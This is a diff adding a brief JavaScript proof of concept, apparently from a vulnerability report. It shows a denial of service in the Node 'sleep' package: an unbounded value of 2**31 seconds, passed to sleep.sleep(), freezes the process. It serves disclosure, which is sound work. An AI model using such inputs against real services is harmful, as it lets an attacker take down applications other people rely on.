@@ -1,0 +1,20 @@
+```javascript
+const sleep = require("sleep");
+
+// The `sleep()` function blocks the Node.js event loop synchronously and
+// performs no upper-bound validation on its input (index.js only rejects
+// negative or non-integer values). An attacker-controlled value can force
+// the process to freeze for an effectively unbounded duration, causing a
+// Denial of Service.
+
+const maliciousSeconds = 2 ** 31; // ~68 years, fully accepted by the check
+
+console.log("Before sleep:", new Date().toISOString());
+console.log("Triggering DoS via sleep(" + maliciousSeconds + ") ...");
+
+sleep.sleep(maliciousSeconds); // blocks the entire process indefinitely
+
+// This line is never reached in any practical timeframe, demonstrating
+// the uncontrolled resource consumption / DoS vulnerability.
+console.log("After sleep:", new Date().toISOString());
+```
